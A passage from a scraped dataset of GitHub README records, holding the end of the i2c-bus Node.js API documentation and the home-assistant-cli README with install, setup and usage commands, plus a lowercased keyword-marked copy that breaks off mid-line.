endaddr\nscans the i2c bus synchronously for devices. the default address range 0x03 through 0x77 is the same as the default address range used by the i2cdetect command line -----> tool !!! . returns an array of numbers where each number represents the i2c address of a device which was detected.\nbus.deviceid(addr, cb)\naddr - i2c device address\ncb - completion callback\nasynchronous i2c device id. the callback gets two arguments (err, id). id is an object with the properties manufacturer, product and if known a human readable name for the associated manufacturer. manufacturer and product are numbers, name is a string.\nbus.deviceidsync(addr)\naddr - i2c device address\nsynchronous i2c device id. returns an object with the properties manufacturer, product and if known a human readable name for the associated manufacturer. manufacturer and product are numbers, name is a string.\nbus.i2cread(addr, length, buffer, cb)\naddr - i2c device address\nlength - an integer specifying the number of bytes to read\nbuffer - the buffer instance that the data will be written to (must conatin at least length bytes)\ncb - completion callback\nasynchronous plain i2c read. the callback gets three argument (err, bytesread, buffer). bytesread is the number of bytes read.\nbus.i2creadsync(addr, length, buffer)\naddr - i2c device address\nlength - an integer specifying the number of bytes to read\nbuffer - the buffer instance that the data will be written to (must conatin at least length bytes)\nsynchronous plain i2c read. returns the number of bytes read.\nbus.i2cwrite(addr, length, buffer, cb)\naddr - i2c device address\nlength - an integer specifying the number of bytes to write\nbuffer - the buffer instance containing the data to write (must conatin at least length bytes)\ncb - completion callback\nasynchronous plain i2c write. the callback gets three argument (err, byteswritten, buffer). byteswritten is the number of bytes written.\nbus.i2cwritesync(addr, length, buffer)\naddr - i2c device address\nlength - an integer specifying the number of bytes to write\nbuffer - the buffer instance containing the data to write (must conatin at least length bytes)\nsynchronous plain i2c write. returns the number of bytes written.\nbus.readbyte(addr, cmd, cb)\naddr - i2c device address\ncmd - command code\ncb - completion callback\nasynchronous smbus read byte. the callback gets two arguments (err, byte). byte is an unsigned integer in the range 0 to 255.\nbus.readbytesync(addr, cmd)\naddr - i2c device address\ncmd - command code\nsynchronous smbus read byte. returns the byte read. byte is an unsigned integer in the range 0 to 255.\nbus.readword(addr, cmd, cb)\naddr - i2c device address\ncmd - command code\ncb - completion callback\nasynchronous smbus read word. the callback gets two arguments (err, word). word is an unsigned integer in the range 0 to 65535.\nbus.readwordsync(addr, cmd)\naddr - i2c device address\ncmd - command code\nsynchronous smbus read word. returns the word read. word is an unsigned integer in the range 0 to 65535.\nbus.readi2cblock(addr, cmd, length, buffer, cb)\naddr - i2c device address\ncmd - command code\nlength - an integer specifying the number of bytes to read (max 32)\nbuffer - the buffer instance that the data will be written to (must conatin at least length bytes)\ncb - completion callback\nasynchronous i2c block read (not defined by the smbus specification). reads a block of bytes from a device, from a designated register that is specified by cmd. the callback gets three arguments (err, bytesread, buffer). bytesread is the number of bytes read.\nbus.readi2cblocksync(addr, cmd, length, buffer)\naddr - i2c device address\ncmd - command code\nlength - an integer specifying the number of bytes to read (max 32)\nbuffer - the buffer instance that the data will be written to (must conatin at least length bytes)\nsynchronous i2c block read (not defined by the smbus specification). reads a block of bytes from a device, from a designated register that is specified by cmd. returns the number of bytes read.\nbus.receivebyte(addr, cb)\naddr - i2c device address\ncb - completion callback\nasynchronous smbus receive byte. the callback gets two arguments (err, byte). byte is an unsigned integer in the range 0 to 255.\nbus.receivebytesync(addr)\naddr - i2c device address\nsynchronous smbus receive byte. returns the byte received. byte is an unsigned integer in the range 0 to 255.\nbus.sendbyte(addr, byte, cb)\naddr - i2c device address\nbyte - data byte. byte is an unsigned integer in the range 0 to 255.\ncb - completion callback\nasynchronous smbus send byte. the callback gets one argument (err).\nbus.sendbytesync(addr, byte)\naddr - i2c device address\nbyte - data byte. byte is an unsigned integer in the range 0 to 255.\nsynchronous smbus send byte.\nbus.writebyte(addr, cmd, byte, cb)\naddr - i2c device address\ncmd - command code\nbyte - data byte. byte is an unsigned integer in the range 0 to 255.\ncb - completion callback\nasynchronous smbus write byte. the callback gets one argument (err).\nbus.writebytesync(addr, cmd, byte)\naddr - i2c device address\ncmd - command code\nbyte - data byte. byte is an unsigned integer in the range 0 to 255.\nsynchronous smbus write byte.\nbus.writeword(addr, cmd, word, cb)\naddr - i2c device address\ncmd - command code\nword - data word. word is an unsigned integer in the range 0 to 65535.\ncb - completion callback\nasynchronous smbus write word. the callback gets one argument (err).\nbus.writewordsync(addr, cmd, word)\naddr - i2c device address\ncmd - command code\nword - data word. word is an unsigned integer in the range 0 to 65535.\nsynchronous smbus write word.\nbus.writequick(addr, bit, cb)\naddr - i2c device address\nbit - bit to write (0 or 1)\ncb - completion callback\nasynchronous smbus quick command. writes a single bit to the device. the callback gets one argument (err).\nbus.writequicksync(addr, bit)\naddr - i2c device address\nbit - bit to write (0 or 1)\nsynchronous smbus quick command. writes a single bit to the device.\nbus.writei2cblock(addr, cmd, length, buffer, cb)\naddr - i2c device address\ncmd - command code\nlength - an integer specifying the number of bytes to write (max 32)\nbuffer - the buffer instance containing the data to write (must conatin at least length bytes)\ncb - completion callback\nasynchronous i2c block write (not defined by the smbus specification). writes a block of bytes to a device, to a designated register that is specified by cmd. the callback gets three argument (err, byteswritten, buffer). byteswritten is the number of bytes written.\nbus.writei2cblocksync(addr, cmd, length, buffer)\naddr - i2c device address\ncmd - command code\nlength - an integer specifying the number of bytes to write (max 32)\nbuffer - the buffer instance containing the data to write (must conatin at least length bytes)\nsynchronous i2c block write (not defined by the smbus specification). writes a block of bytes to a device, to a designated register that is specified by cmd.\nbus.promisifiedbus()\nreturn the promisifiedbus instance for this bus instance.\npromisifiedbus.close()\nasynchronous close. returns a promise that will be resolved with no arguments once the underlying resources have been released, or will be rejected if an error occurs while closing.\npromisifiedbus.i2cfuncs()\ndetermine functionality of the bus/adapter asynchronously. returns a promise that on success will be resolved with a frozen i2cfuncs object describing the functionality available. the returned promise will be rejected if an error occurs. see also i2c functionality.\npromisifiedbus.scan([startaddr,] [endaddr])\nstartaddr - an integer specifying the start address of the scan range, optional\nendaddr - an integer specifying the end addrerss of the scan range, optional\nbus.scan() - scan for i2c devices in address range 0x03 through 0x77\nbus.scan(addr) - scan for an i2c device at address addr\nbus.scan(startaddr, endaddr) - scan for i2c devices in address range startaddr through endaddr\nscans the i2c bus asynchronously for devices. the default address range 0x03 through 0x77 is the same as the default address range used by the i2cdetect command line -----> tool !!! . returns a promise that on success will be resolved with an array of numbers where each number represents the i2c address of a device which was detected. the returned promise will be rejected if an error occurs.\npromisifiedbus.deviceid(addr)\naddr - i2c device address\nasynchronous i2c device id. returns a promise that will be resolved with an id object on success, or will be rejected if an error occurs. id is an object with the properties manufacturer, product and if known a human readable name for the associated manufacturer. manufacturer and product are numbers, name is a string.\npromisifiedbus.i2cread(addr, length, buffer)\naddr - i2c device address\nlength - an integer specifying the number of bytes to read\nbuffer - the buffer instance that the data will be written to (must conatin at least length bytes)\nasynchronous plain i2c read. returns a promise that on success will be resolved with an object with a bytesread property identifying the number of bytes read, and a buffer property that is a reference to the passed in buffer argument. the returned promise will be rejected if an error occurs.\npromisifiedbus.i2cwrite(addr, length, buffer)\naddr - i2c device address\nlength - an integer specifying the number of bytes to write\nbuffer - the buffer instance containing the data to write (must conatin at least length bytes)\nasynchronous plain i2c write. returns a promise that on success will be resolved with an object with a byteswritten property identifying the number of bytes written, and a buffer property that is a reference to the passed in buffer argument. the returned promise will be rejected if an error occurs.\npromisifiedbus.readbyte(addr, cmd)\naddr - i2c device address\ncmd - command code\nasynchronous smbus read byte. returns a promise that will be resolved with a number representing the byte read on success, or will be rejected if an error occurs. byte is an unsigned integer in the range 0 to 255.\npromisifiedbus.readword(addr, cmd)\naddr - i2c device address\ncmd - command code\nasynchronous smbus read word. returns a promise that will be resolved with a number representing the word read on success, or will be rejected if an error occurs. word is an unsigned integer in the range 0 to 65535.\npromisifiedbus.readi2cblock(addr, cmd, length, buffer)\naddr - i2c device address\ncmd - command code\nlength - an integer specifying the number of bytes to read (max 32)\nbuffer - the buffer instance that the data will be written to (must conatin at least length bytes)\nasynchronous i2c block read (not defined by the smbus specification). reads a block of bytes from a device, from a designated register that is specified by cmd. returns a promise that on success will be resolved with an object with a bytesread property identifying the number of bytes read, and a buffer property that is a reference to the passed in buffer argument. the returned promise will be rejected if an error occurs.\npromisifiedbus.receivebyte(addr)\naddr - i2c device address\nasynchronous smbus receive byte. returns a promise that will be resolved with a number representing the byte received on success, or will be rejected if an error occurs. byte is an unsigned integer in the range 0 to 255.\npromisifiedbus.sendbyte(addr, byte)\naddr - i2c device address\nbyte - data byte. byte is an unsigned integer in the range 0 to 255.\nasynchronous smbus send byte. returns a promise that will be resolved with no arguments on success, or will be rejected if an error occurs.\npromisifiedbus.writebyte(addr, cmd, byte)\naddr - i2c device address\ncmd - command code\nbyte - data byte. byte is an unsigned integer in the range 0 to 255.\nasynchronous smbus write byte. returns a promise that will be resolved with no arguments on success, or will be rejected if an error occurs.\npromisifiedbus.writeword(addr, cmd, word)\naddr - i2c device address\ncmd - command code\nword - data word. word is an unsigned integer in the range 0 to 65535.\nasynchronous smbus write word. returns a promise that will be resolved with no arguments on success, or will be rejected if an error occurs.\npromisifiedbus.writequick(addr, bit)\naddr - i2c device address\nbit - bit to write (0 or 1)\nasynchronous smbus quick command. writes a single bit to the device. returns a promise that will be resolved with no arguments on success, or will be rejected if an error occurs.\npromisifiedbus.writei2cblock(addr, cmd, length, buffer)\naddr - i2c device address\ncmd - command code\nlength - an integer specifying the number of bytes to write (max 32)\nbuffer - the buffer instance containing the data to write (must conatin at least length bytes)\nasynchronous i2c block write (not defined by the smbus specification). writes a block of bytes to a device, to a designated register that is specified by cmd. returns a promise that on success will be resolved with an object with a byteswritten property identifying the number of bytes written, and a buffer property that is a reference to the passed in buffer argument. the returned promise will be rejected if an error occurs.\npromisifiedbus.bus()\nreturn the bus instance for this promisifiedbus instance.\nfuncs.i2c - boolean\nspecifies whether or not the adapter handles plain i2c-level commands (pure smbus adapters typically can not do these, i2c_func_i2c).\nfuncs.tenbitaddr - boolean\nspecifies whether or not the adapter handles the 10-bit address extensions (i2c_func_10bit_addr).\nfuncs.protocolmangling - boolean\nspecifies whether or not the adapter knows about the i2c_m_ignore_nak, i2c_m_rev_dir_addr and i2c_m_no_rd_ack flags (which modify the i2c protocol! i2c_func_protocol_mangling).\nfuncs.smbuspec - boolean\nspecifies whether or not the adapter handles packet error checking (i2c_func_smbus_pec).\nfuncs.smbusblockproccall - boolean\nspecifies whether or not the adapter handles the smbus block process call command (i2c_func_smbus_block_proc_call).\nfuncs.smbusquick - boolean\nspecifies whether or not the adapter handles the smbus quick command (i2c_func_smbus_quick).\nfuncs.smbusreceivebyte - boolean\nspecifies whether or not the adapter handles the smbus receive byte command (i2c_func_smbus_read_byte).\nfuncs.smbussendbyte - boolean\nspecifies whether or not the adapter handles the smbus send byte command (i2c_func_smbus_write_byte).\nfuncs.smbusreadbyte - boolean\nspecifies whether or not the adapter handles the smbus read byte command (i2c_func_smbus_read_byte_data).\nfuncs.smbuswritebyte - boolean\nspecifies whether or not the adapter handles the smbus write byte command (i2c_func_smbus_write_byte_data).\nfuncs.smbusreadword - boolean\nspecifies whether or not the adapter handles the smbus read word command (i2c_func_smbus_read_word_data).\nfuncs.smbuswriteword - boolean\nspecifies whether or not the adapter handles the smbus write word command (i2c_func_smbus_write_word_data).\nfuncs.smbusproccall - boolean\nspecifies whether or not the adapter handles the smbus process call command (i2c_func_smbus_proc_call).\nfuncs.smbusreadblock - boolean\nspecifies whether or not the adapter handles the smbus read block command (i2c_func_smbus_read_block_data).\nfuncs.smbuswriteblock - boolean\nspecifies whether or not the adapter handles the smbus write block command (i2c_func_smbus_write_block_data).\nfuncs.smbusreadi2cblock - boolean\nspecifies whether or not the adapter handles the smbus read i2c block command (i2c_func_smbus_read_i2c_block).\nfuncs.smbuswritei2cblock - boolean\nspecifies whether or not the adapter handles the smbus write i2c block command (i2c_func_smbus_write_i2c_block).\ntypescript type definitions\ntypescript type definitions for i2c-bus can be found in the definitely typed repository at https://github.com/definitelytyped/definitelytyped/tree/master/types/i2c-bus.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000278, "year": null}, {"Unnamed: 0": 279, "autor": 279, "date": null, "content": "Home Assistant Command-line Interface (hass-cli)\nThe Home Assistant Command-line interface (hass-cli) allows one to work with a local or a remote Home Assistant Core or Home Assistant (former Hass.io) instance directly from the command-line.\nInstallation\nTo use latest release:\n$ pip install homeassistant-cli\nTo use latest pre-release from dev branch:\n$ pip install git+https://github.com/home-assistant-ecosystem/home-assistant-cli@dev\nThe developers of hass-cli usually provide up-to-date packages for recent Fedora and EPEL releases. Use dnf for the installation:\n$ sudo dnf -y install home-assistant-cli\nThe community is providing support for macOS through homebew.\n$ brew install homeassistant-cli\nKeep in mind that the available releases in the distribution could be out-dated.\nhome-assistant-cli is also available for NixOS.\nTo use the tool on NixOS. Keep in mind that the latest release could only be available in the unstable channel.\n$ nix-env -iA nixos.home-assistant-cli\nDocker\nIf you do not have a Python setup you can try use hass-cli via a container using Docker.\n$ docker run homeassistant/home-assistant-cli\nTo make auto-completion and access environment work like other scripts you'll need to create a script file to execute.\n$ curl https://raw.githubusercontent.com/home-assistant/home-assistant-cli/master/docker-hass-cli > hass-cli\n$ chmod +x hass-cli\nNow put the hass-cli script into your path and you can use it like if you had installed it via command line as long as you don't need file system access (like for hass-cli template).\nSetup\nTo get started you'll need to have or generate a long lasting token format on your Home Assistant profile page (i.e. https://localhost:8123/profile then scroll down to \"Long-Lived Access Tokens\").\nThen you can use --server and --token parameter on each call or as is recommended setup HASS_SERVER and HASS_TOKEN environment variables.\n$ export HASS_SERVER=https://homeassistant.local:8123\n$ export HASS_TOKEN=<secret>\nOnce that is enabled and you are using either zsh or bash run the following to enable autocompletion for hass-cli commands.\n$ source <(hass-cli completion zsh)\nUsage\nNote: Below is listed some of the features, make sure to use --help and autocompletion to learn more of the features as they become available.\nMost commands returns a table version of what the Home Assistant API returns. For example to get basic info about your Home Assistant server you use info:\n$ hass-cli info\nBASE_URL LOCATION REQUIRES_API_PASWORD VERSION\nhttps://home-assistant.local:8123 Fort of Solitude False 0.86.2\nIf you prefer yaml you can use --output=yaml:\n$ hass-cli --output yaml info\nbase_url: https://home-assistant.local:8123\nlocation_name: Wayne Manor\nrequires_api_password: false\nversion: 0.86.2\nTo get list of states you use state list:\n$ hass-cli state list\nENTITY DESCRIPTION STATE\nzone.school School zoning\nzone.home Andersens zoning\nsun.sun Sun below_horizon\ncamera.babymonitor babymonitor idle\ntimer.timer_office_lights idle\ntimer.timer_small_bathroom idle\n[...]\nYou can use --no-headers to suppress the header.\n--table-format let you select which table format you want. Default is simple but you can use any of the formats supported by https://pypi.org/project/tabulate/: plain, simple, github, grid, fancy_grid, pipe, orgtbl, rst, mediawiki, html, latex, latex_raw, latex_booktabs or tsv\nFinally, you can also via --columns control which data you want shown. Each column has a name and a jsonpath. The default setup for entities are:\n--columns=ENTITY=entity_id,DESCRIPTION=attributes.friendly_name,STATE=state,CHANGED=last_changed\nIf you for example just wanted the name and all attributes you could do:\n$ hass-cli --columns=ENTITY=\"entity_id,ATTRIBUTES=attributes[*]\" state list zone\nENTITY ATTRIBUTES\nzone.school {'friendly_name': 'School', 'hidden': True, 'icon': 'mdi:school', 'latitude': 7.011023, 'longitude': 16.858151, 'radius': 50.0}\nzone.unnamed_zone {'friendly_name': 'Unnamed zone', 'hidden': True, 'icon': 'mdi:home', 'latitude': 37.006476, 'longitude': 2.861699, 'radius': 50.0}\nzone.home {'friendly_name': 'Andersens', 'hidden': True, 'icon': 'mdi:home', 'latitude': 27.006476, 'longitude': 7.861699, 'radius': 100}\nYou can get more details about a state by using yaml or json output format. In this example we use the shorthand of output: -o:\n$ hass-cli -o yaml state get light.guestroom_light \u25fc\nattributes:\nfriendly_name: Guestroom Light\nsupported_features: 61\ncontext:\nid: 84d52fe306ec4895948b546b492702a4\nuser_id: null\nentity_id: light.guestroom_light\nlast_changed: '2018-12-10T18:33:51.883238+00:00'\nlast_updated: '2018-12-10T18:33:51.883238+00:00'\nstate: 'off'\nYou can edit state via an editor:\n$ hass-cli state edit light.guestroom_light\nThis will open the current state in your favorite editor and any changes you save will be used for an update.\nYou can also explicitly create/edit via the --json flag:\n$ hass-cli state edit sensor.test --json='{ \"state\":\"off\"}'\nList possible services with or without a regular expression filter:\n$ hass-cli service list 'home.*toggle'\nDOMAIN SERVICE DESCRIPTION\nhomeassistant toggle Generic service to toggle devices on/off...\nFor more details the YAML format is useful:\n$ hass-cli -o yaml service list homeassistant.toggle\nhomeassistant:\nservices:\ntoggle:\ndescription: Generic service to toggle devices on/off under any domain. Same\nusage as the light.turn_on, switch.turn_on, etc. services.\nfields:\nentity_id:\ndescription: The entity_id of the device to toggle on/off.\nexample: light.living_room\nYou can get history about one or more entities, here getting state changes for the last 50 minutes:\n$ hass-cli state history --since 50m light.kitchen_light_1 binary_sensor.presence_kitchen\nENTITY DESCRIPTION STATE CHANGED\nbinary_sensor.presence_kitchen Kitchen Motion off 2019-01-27T23:19:55.322474+00:00\nbinary_sensor.presence_kitchen Kitchen Motion on 2019-01-27T23:21:44.015071+00:00\nbinary_sensor.presence_kitchen Kitchen Motion off 2019-01-27T23:22:02.330566+00:00\nlight.kitchen_light_1 Kitchen Light 1 on 2019-01-27T23:19:55.322474+00:00\nlight.kitchen_light_1 Kitchen Light 1 off 2019-01-27T23:36:45.254266+00:00\nThe data is sorted by default as Home Assistant returns it, thus for history it is useful to sort by a property:\n$ hass-cli --sort-by last_changed state history --since 50m light.kitchen_light_1 binary_sensor.presence_kitchen\nENTITY DESCRIPTION STATE CHANGED\nbinary_sensor.presence_kitchen Kitchen Motion off 2019-01-27T23:18:00.717611+00:00\nlight.kitchen_light_1 Kitchen Light 1 on 2019-01-27T23:18:00.717611+00:00\nbinary_sensor.presence_kitchen Kitchen Motion on 2019-01-27T23:18:12.135015+00:00\nbinary_sensor.presence_kitchen Kitchen Motion off 2019-01-27T23:18:30.417064+00:00\nlight.kitchen_light_1 Kitchen Light 1 off 2019-01-27T23:36:45.254266+00:00\nNote: the --sort-by argument is referring to the attribute in the underlying json/yaml NOT the column name. The advantage for this is that it can be used for sorting on any property even if not included in the default output.\nAreas and Device Registry\nSince v0.87 of Home Assistant there is a notion of Areas in the Device registry. hass-cli lets you list devices and areas and assign areas to devices.\nListing devices and areas works similar to list Entities.\n$ hass-cli device list\nID NAME MODEL MANUFACTURER AREA\na3852c3c3ebd47d3acac195478ca6f8b Basement stairs motion SML001 Philips c6c962b892064a218e968fcaee7950c8\n880a944e74db4bb48ea3db6dd24af357 Basement Light 2 TRADFRI bulb GU10 WS 400lm IKEA of Sweden c6c962b892064a218e968fcaee7950c8\n657c3cc908594479aab819ff80d0c710 Office Hue white lamp Philips None\n[...]\n$ hass-cli area list\nID NAME\n295afc88012341ecb897cd12d3fbc6b4 Bathroom\n9e08d89203804d5db995c3d0d5dbd91b Winter Garden\n8816ee92b7b84f54bbb30a68b877e739 Office\n[...]\nYou can create and delete areas:\n$ hass-cli area delete \"Old Shed\"\n- id: 1\ntype: result\nsuccess: true\nresult: success\n$ hass-cli area create \"New Shed\"\n- id: 1\ntype: result\nsuccess: true\nresult:\narea_id: cdd09a80f03a4cc59d2943053c0414c0\nname: New Shed\nYou can assign area to a specific device. Here the Kitchen area gets assigned to device named \"Cupboard Light\".\n$ hass-cli device assign Kitchen \"Cupboard Light\"\nBesides assigning individual devices you can assign in bulk:\n$ hass-cli device assign Kitchen --match \"Kitchen Light\"\nThe above line will assign Kitchen area to all devices with substring \"Kitchen Light\".\nYou can also combine individual and matched devices in one line:\n$ hass-cli device assign Kitchen --match \"Kitchen Light\" eab9930f8652408882cc8cb604651c60 Cupboard\nAbove will assign area named \"Kitchen\" to all devices having substring \"Kitchen Light\" and to specific area with id \"eab9930...\" or named \"Cupboard\".\nEvents\nYou can subscribe and watch all or a specific event type using event watch.\n$ hass-cli event watch\nThis will watch for all event types, you can limit to a specific event type by specifying it as an argument:\n$ hass-cli event watch deconz_event\nHome Assistant (former Hass.io)\nIf you are using Home Assistant (former Hass.io) there are commands available for you to interact with Home Assistant services/systems. This includes the underlying services like the supervisor.\nCheck the Supervisor release you are running:\n$ hass-cli ha supervisor info\nresult: ok\ndata:\nversion: '217'\nversion_latest: '217'\nchannel: stable\n[...]\nCheck the Core release you are using at the moment:\n$ hass-cli ha core info\nresult: ok\ndata:\nversion: 0.108.2\nversion_latest: 0.108.3\n[...]\nUpdate Core to the latest available release:\n$ hass-cli ha core update\nOther\nYou can call services:\n$ hass-cli service call deconz.device_refresh\nWith arguments:\n$ hass-cli service call homeassistant.toggle --arguments entity_id=light.office_light\nOpen a map for your Home Assistant location:\n$ hass-cli map\nRender templates server side:\n$ hass-cli template motionlight.yaml.j2 motiondata.yaml\nRender templates client (local) side:\n$ hass-cli template --local lovelace-template.yaml\nAuto-completion\nAs described above you can use source <(hass-cli completion zsh) to quickly and easy enable auto completion. If you do it from your .bashrc or .zshrc it's recommend to use the form below as that does not trigger a run of hass-cli itself.\nFor zsh:\neval \"$(_HASS_CLI_COMPLETE=source_zsh hass-cli)\"\nFor bash:\neval \"$(_HASS_CLI_COMPLETE=source hass-cli)\"\nOnce enabled there is autocompletion for commands and for certain attributes like entities:\n$ hass-cli state get light.<TAB> \u23ce \u2731 \u25fc\nlight.kitchen_light_5 light.office_light light.basement_light_4 light.basement_light_9 light.dinner_table_light_4 light.winter_garden_light_2 light.kitchen_light_2\nlight.kitchen_table_light_1 light.hallroom_light_2 light.basement_light_5 light.basement_light_10 light.dinner_table_wall_light light.winter_garden_light_4 light.kitchen_table_light_2\nlight.kitchen_light_1 light.hallroom_light_1 light.basement_light_6 light.small_bathroom_light light.dinner_table_light_5 light.winter_garden_light_3 light.kitchen_light_4\n[...]\nNote: For this to work you'll need to have setup the following environment variables if your Home Assistant installation is secured and not running on localhost:8123:\nexport HASS_SERVER=http://homeassistant.local:8123\nexport HASS_TOKEN=eyJ0eXAiO-----------------------ed8mj0NP8\nHelp\n$ hass-cli\nUsage: hass-cli [OPTIONS] COMMAND [ARGS]...\nCommand line interface for Home Assistant.\nOptions:\n-l, --loglevel LVL Either CRITICAL, ERROR, WARNING, INFO or\nDEBUG\n--version Show the version and exit.\n-s, --server TEXT The server URL or `auto` for automatic\ndetection. Can also be set with the\nenvironment variable HASS_SERVER. [default:\nauto]\n--token TEXT The Bearer token for Home Assistant\ninstance. Can also be set with the\nenvironment variable HASS_TOKEN.\n--password TEXT The API password for Home Assistant\ninstance. Can also be set with the\nenvironment variable HASS_PASSWORD.\n--timeout INTEGER Timeout for network operations. [default:\n5]\n-o, --output [json|yaml|table|ndjson|auto]\nOutput format. [default: auto]\n-v, --verbose Enables verbose mode.\n-x Print backtraces when exception occurs.\n--cert TEXT Path to client certificate file (.pem) to\nuse when connecting.\n--insecure Ignore SSL Certificates. Allow to connect to\nservers with self-signed certificates. Be\ncareful!\n--debug Enables debug mode.\n--columns TEXT Custom columns key=value list. Example:\nENTITY=entity_id,\nNAME=attributes.friendly_name\n--no-headers When printing tables don't use headers\n(default: print headers)\n--table-format TEXT Which table format to use.\n--sort-by TEXT Sort table by the jsonpath expression.\nExample: last_changed\n--help Show this message and exit.\nCommands:\narea Get info and operate on areas from Home Assistant...\ncompletion Output shell completion code for the specified shell (bash or...\nconfig Get configuration from a Home Assistant instance.\ndevice Get info and operate on devices from Home Assistant...\ndiscover Discovery for the local network.\nentity Get info on entities from Home Assistant.\nevent Interact with events.\nha Home Assistant (former Hass.io) commands.\ninfo Get basic info from Home Assistant.\nmap Show the location of the config or an entity on a map.\nraw Call the raw API (advanced).\nservice Call and work with services.\nstate Get info on entity state from Home Assistant.\nsystem System details and operations for Home Assistant.\ntemplate Render templates on server or locally.\nClone the git repository and\n$ pip3 install --editable .\nDevelopment\nDeveloping is (re)using as much as possible from [Home Assistant development setup](https://developers.home-assistant.io/docs/en/development_environment.html).\nRecommended way to develop is to use virtual environment to ensure isolation from rest of your system using the following steps:\nClone the git repository and do the following:\n$ python3 -m venv .\n$ source bin/activate\n$ script/setup\nafter this you should be able to edit the source code and running hass-cli directly:\n$ hass-cli", "link": "https://github.com/home-assistant-ecosystem/home-assistant-cli", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "home assistant command-line interface (hass-cli)\nthe home assistant command-line interface (hass-cli) allows one to work with a local or a remote home assistant core or home assistant (former hass.io) instance directly from the command-line.\ninstallation\nto use latest release:\n$ pip install homeassistant-cli\nto use latest pre-release from dev branch:\n$ pip install git+https://github.com/home-assistant-ecosystem/home-assistant-cli@dev\nthe developers of hass-cli usually provide up-to-date packages for recent fedora and epel releases. use dnf for the installation:\n$ sudo dnf -y install home-assistant-cli\nthe community is providing support for macos through homebew.\n$ brew install homeassistant-cli\nkeep in mind that the available releases in the distribution could be out-dated.\nhome-assistant-cli is also available for nixos.\nto use the -----> tool !!!  on nixos. keep in mind that the latest release could only be available in the unstable channel.\n$ nix-env -ia nixos.home-assistant-cli\ndocker\nif you do not have a python setup you can try use hass-cli via a container using docker.\n$ docker run homeassistant/home-assistant-cli\nto make auto-completion and access environment work like other scripts you'll need to create a script file to execute.\n$ curl https://raw.githubusercontent.com/home-assistant/home-assistant-cli/master/docker-hass-cli > hass-cli\n$ chmod +x hass-cli\nnow put the hass-cli script into your path and you can use it like if you had installed it via command line as long as you don't need file system access (like for hass-cli template).\nsetup\nto get started you'll need to have or generate a long lasting token format on your home assistant profile page (i.e. https://localhost:8123/profile then scroll down to \"long-lived access tokens\").\nthen you can use --server and --token parameter on each call or as is recommended setup hass_server and hass_token environment variables.\n$ export hass_server=https://homeassistant.local:8123\n$ export hass_token=<secret>\nonce that is enabled and you are using either zsh or bash run the following to enable autocompletion for hass-cli commands.\n$ source <(hass-cli completion zsh)\nusage\nnote: below is listed some of the features, make sure to use --help and autocompletion to learn more of the features as they become available.\nmost commands returns a table version of what the home assistant api returns. for example to get basic info about your home assistant server you use info:\n$ hass-cli info\nbase_url location requires_api_pasword version\nhttps://home-assistant.local:8123 fort of solitude false 0.86.2\nif you prefer yaml you can use --output=yaml:\n$ hass-cli --output yaml info\nbase_url: https://home-assistant.local:8123\nlocation_name: wayne manor\nrequires_api_password: false\nversion: 0.86.2\nto get list of states you use state list:\n$ hass-cli state list\nentity description state\nzone.school school zoning\nzone.home andersens zoning\nsun.sun sun below_horizon\ncamera.babymonitor babymonitor idle\ntimer.timer_office_lights idle\ntimer.timer_small_bathroom idle\n[...]\nyou can use --no-headers to suppress the header.\n--table-format let you select which table format you want. default is simple but you can use any of the formats supported by https://pypi.org/project/tabulate/: plain, simple, github, grid, fancy_grid, pipe, orgtbl, rst, mediawiki, html, latex, latex_raw, latex_booktabs or tsv\nfinally, you can also via --columns control which data you want shown. each column has a name and a jsonpath. the default setup for entities are:\n--columns=entity=entity_id,description=attributes.friendly_name,state=state,changed=last_changed\nif you for example just wanted the name and all attributes you could do:\n$ hass-cli --columns=entity=\"entity_id,attributes=attributes[*]\" state list zone\nentity attributes\nzone.school {'friendly_name': 'school', 'hidden': true, 'icon': 'mdi:school', 'latitude': 7.011023, 'longitude': 16.858151, 'radius': 50.0}\nzone.unnamed_zone {'friendly_name': 'unnamed zone', 'hidden': true, 'icon': 'mdi:home', 'latitude': 37.006476, 'longitude': 2.861699, 'radius': 50.0}\nzone.home {'friendly_name': 'andersens', 'hidden': true, 'icon': 'mdi:home', 'latitude': 27.006476, 'longitude': 7.861699, 'radius': 100}\nyou can get more details about a state by using yaml or json output format. in this example we use the shorthand of output: -o:\n$ hass-cli -o yaml state get light.guestroom_light \u25fc\nattributes:\nfriendly_name: guestroom light\nsupported_features: 61\ncontext:\nid: 84d52fe306ec4895948b546b492702a4\nuser_id: null\nentity_id: light.guestroom_light\nlast_changed: '2018-12-10t18:33:51.883238+00:00'\nlast_updated: '2018-12-10t18:33:51.883238+00:00'\nstate: 'off'\nyou can edit state via an editor:\n$ hass-cli state edit light.guestroom_light\nthis will open the current state in your favorite editor and any changes you save will be used for an update.\nyou can also explicitly create/edit via the --json flag:\n$ hass-cli state edit sensor.test --json='{ \"state\":\"off\"}'\nlist possible services with or without a regular expression filter:\n$ hass-cli service list 'home.*toggle'\ndomain service description\nhomeassistant toggle generic service to toggle devices on/off...\nfor more details the yaml format is useful:\n$ hass-cli -o yaml service list homeassistant.toggle\nhomeassistant:\nservices:\ntoggle:\ndescription: generic service to toggle devices on/off under any domain. same\nusage as the light.turn_on, switch.turn_on, etc. services.\nfields:\nentity_id:\ndescription: the entity_id of the device to toggle on/off.\nexample: light.living_room\nyou can get history about one or more entities, here getting state changes for the last 50 minutes:\n$ hass-cli state history --since 50m light.kitchen_light_1 binary_sensor.presence_kitchen\nentity description state changed\nbinary_sensor.presence_kitchen kitchen motion off 2019-01-27t23:19:55.322474+00:00\nbinary_sensor.presence_kitchen kitchen motion on 2019-01-27t23:21:44.015071+00:00\nbinary_sensor.presence_kitchen kitchen motion off 2019-01-27t23:22:02.330566+00:00\nlight.kitchen_light_1 kitchen light 1 on 2019-01-27t23:19:55.322474+00:00\nlight.kitchen_light_1 kitchen light 1 off 2019-01-27t23:36:45.254266+00:00\nthe data is sorted by default as home assistant returns it, thus for history it is useful to sort by a property:\n$ hass-cli --sort-by last_changed state history --since 50m light.kitchen_light_1 binary_sensor.presence_kitchen\nentity description state changed\nbinary_sensor.presence_kitchen kitchen motion off 2019-01-27t23:18:00.717611+00:00\nlight.kitchen_light_1 kitchen light 1 on 2019-01-27t23:18:00.717611+00:00\nbinary_sensor.presence_kitchen kitchen motion on 2019-01-27t23:18:12.135015+00:00\nbinary_sensor.presence_kitchen kitchen motion off 2019-01-27t23:18:30.417064+00:00\nlight.kitchen_light_1 kitchen light 1 off 